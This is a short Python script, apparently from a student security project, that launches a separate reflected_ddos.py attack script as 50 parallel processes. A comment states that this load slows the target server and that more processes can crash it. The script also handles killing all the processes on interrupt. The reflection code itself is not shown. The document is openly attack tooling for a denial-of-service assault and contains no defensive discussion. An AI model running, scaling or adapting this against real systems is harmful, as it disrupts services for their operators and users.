"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

Reflected DDoS

This script will run the reflected_ddos.py script 50 times in parallel. For more information, see the README.md file.

Usage : python3 main.py
"""
import subprocess
import time
import os


def run_reflected_ddos(command, process_list):
    """
    Function to run a command with Popen and store the process in a list
    """
    # arbitrary number but it is enough to make the server slows down, more can make the server crash
    number_of_processes = 50
    for i in range(number_of_processes):
        print("[+] Starting Reflected DDoS Attack id: {}".format(i))
        process = subprocess.Popen(command)
        process_list.append(process)


if __name__ == "__main__":
    # List to store the Popen processes
    process_list = []

    command = ['python3', 'reflected_ddos.py']
    run_reflected_ddos(command, process_list)

    print("[INFO] Press CTRL+C to kill the running processes ...")

    try:
        while (True):
            time.sleep(1)
    except KeyboardInterrupt as e:
        # Terminate all the processes in the list
        for process in process_list:
            process.terminate()
            os.kill(process.pid, 9)  # Ensure the process is killed (optional)

        # Wait for all processes to terminate
        for process in process_list:
            process.wait()

        print("All processes terminated")
